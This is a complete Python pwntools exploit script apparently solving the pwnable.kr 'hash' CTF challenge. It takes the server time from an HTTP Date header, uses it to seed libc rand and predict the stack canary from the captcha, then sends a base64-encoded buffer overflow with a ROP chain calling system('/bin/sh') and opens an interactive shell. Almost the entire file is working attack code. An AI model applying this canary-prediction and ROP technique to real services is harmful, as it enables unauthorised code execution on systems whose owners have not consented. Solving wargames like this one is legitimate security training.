#!/usr/bin/env python3


from ctypes import CDLL
from pwn import *
import numpy as np
import time
from datetime import datetime
from calendar import timegm
import sys
import base64

def get_server_time(http):
    http.send(b"GET / HTTP1.1\n\n")
    print(http.readuntil(b"Date: "))
    text_date = http.readuntilS("\n")[:-2]
    print(f"Text Date {text_date}")
    epoch = datetime(1970, 1, 1)
    utc_time = datetime.strptime(text_date, "%a, %d %b %Y %H:%M:%S %Z") - epoch
    
    
    return int(utc_time.total_seconds())

# Setup our rop chain
binary = ELF("./hash")
rop = ROP(binary)
rop.call("process_hash")
rop.call("system", [0x0804b0e0]) # Call system with /bin/sh

print(rop.dump())

# Set up srand and rand
libc = CDLL("libc.so.6")

# Shellcode base.
data = b"A"*512 

# Start the HTTP server, but don't send the request until we're ready.
http = remote("pwnable.kr", 80)

# Start the server.
s = remote("localhost", 2020)

# Get the server time as quickly as possible.
server_time = get_server_time(http)
print(f"Server time (seed): {server_time}")

s.readuntilS("captcha : ")

# Get the captcha string, remove the newline, convert to python int.
captcha = int(s.readuntilS("\n")[:-1])
print(f"Capcha: {captcha}")

int32_captcha = np.int32(captcha)


# Initialize srand with our assumed timestmap.
libc.srand(server_time)

# Generate our 8 random values.
# Note: Numpy is used here because it's implemented in C/C++ and 
# respects the 32-bit overflows. Warnings thrown here are totally normal,
# and intended. If this was done in python, there wouldn't be any overflows,
# and that's needed to restrain the values to 4-bytes.
random_values = list()
for x in range(0, 8):
    random_values.append(np.int32(libc.rand()))

print("Random Values: ")
print(random_values)


# Calculate the value we will use to calculate the stack canary from the captcha
random_component = random_values[5] + random_values[1] + (random_values[2] - random_values[3]) + random_values[7] + (random_values[4] - random_values[6])

canary = int(int32_captcha - random_component).to_bytes(4, "little", signed=True)

print(f"Suspected canary: {canary}")

# Add it onto our data.
data = data + canary + b"B" * 12 + rop.chain()

# Encode our data
b64data = base64.b64encode(data)

# Send the captcha, as it was sent to us.
s.sendline(str(captcha))
s.recvuntil(b"paste me!")
print(f"Sending: {b64data}")
s.sendline(b64data)
print(s.readline())
print(s.readline())

# Now type /bin/sh when the interactive prompt comes up. You'll drop into a shell.
s.interactive()
